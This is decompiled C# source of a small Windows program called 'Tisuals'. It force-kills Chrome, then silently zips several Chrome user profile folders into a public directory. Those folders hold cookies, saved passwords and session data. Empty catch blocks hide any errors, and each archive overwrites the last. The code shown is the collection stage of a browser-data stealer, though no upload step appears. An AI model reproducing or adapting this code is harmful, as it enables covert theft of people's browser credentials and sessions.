// Decompiled with JetBrains decompiler
// Type: Tisuals.Program
// Assembly: Tisuals, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 74C97243-796D-4722-8535-CC8329539940
// Assembly location: C:\Users\adame\OneDrive\Desktop\Tisuals.exe

using Ionic.Zip;
using System;
using System.Diagnostics;


namespace Tisuals
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            foreach (Process process in Process.GetProcessesByName("chrome"))
            {
                try
                {
                    process.Kill();
                }
                catch
                {
                }
            }
            string str = Environment.GetEnvironmentVariable("LocalAppData") + "\\Google\\Chrome\\User Data\\Profile 9";
            string str1 = Environment.GetEnvironmentVariable("LocalAppData") + "\\Google\\Chrome\\User Data\\Profile 8";
            string str2 = Environment.GetEnvironmentVariable("LocalAppData") + "\\Google\\Chrome\\User Data\\Profile 10";
            string str3 = Environment.GetEnvironmentVariable("LocalAppData") + "\\Google\\Chrome\\User Data\\Profile 11";
            string str4 = Environment.GetEnvironmentVariable("LocalAppData") + "\\Google\\Chrome\\User Data\\Profile 6";
            string str5 = Environment.GetEnvironmentVariable("LocalAppData") + "\\Google\\Chrome\\User Data\\Profile 4";
            using (ZipFile zipFile = new ZipFile())
            {
                try
                {
                    zipFile.UseUnicodeAsNecessary = true;
                    zipFile.AddDirectory(str);
                    zipFile.Comment = "This zip was created at " + DateTime.Now.ToString("G");
                    zipFile.Save("c:/users/public/def.zip");
                }
                catch
                {
                }
            }

            using (ZipFile zipFile = new ZipFile())
            {
                try
                {
                    zipFile.UseUnicodeAsNecessary = true;
                    zipFile.AddDirectory(str1);
                    zipFile.Comment = "This zip was created at " + DateTime.Now.ToString("G");
                    zipFile.Save("c:/users/public/def.zip");
                }
                catch
                {
                }
            }
            using (ZipFile zipFile = new ZipFile())
            {
                try
                {
                    zipFile.UseUnicodeAsNecessary = true;
                    zipFile.AddDirectory(str2);
                    zipFile.Comment = "This zip was created at " + DateTime.Now.ToString("G");
                    zipFile.Save("c:/users/public/def.zip");
                }
                catch
                {
                }
            }
            using (ZipFile zipFile = new ZipFile())
            {
                try
                {
                    zipFile.UseUnicodeAsNecessary = true;
                    zipFile.AddDirectory(str3);
                    zipFile.Comment = "This zip was created at " + DateTime.Now.ToString("G");
                    zipFile.Save("c:/users/public/def.zip");
                }
                catch
                {
                }
            }
            using (ZipFile zipFile = new ZipFile())
            {
                try
                {
                    zipFile.UseUnicodeAsNecessary = true;
                    zipFile.AddDirectory(str4);
                    zipFile.Comment = "This zip was created at " + DateTime.Now.ToString("G");
                    zipFile.Save("c:/users/public/def.zip");
                }
                catch
                {
                }
            }
            using (ZipFile zipFile = new ZipFile())
            {
                try
                {
                    zipFile.UseUnicodeAsNecessary = true;
                    zipFile.AddDirectory(str5);
                    zipFile.Comment = "This zip was created at " + DateTime.Now.ToString("G");
                    zipFile.Save("c:/users/public/def.zip");
                }
                catch
                {
                }
            }
        }
    }
}
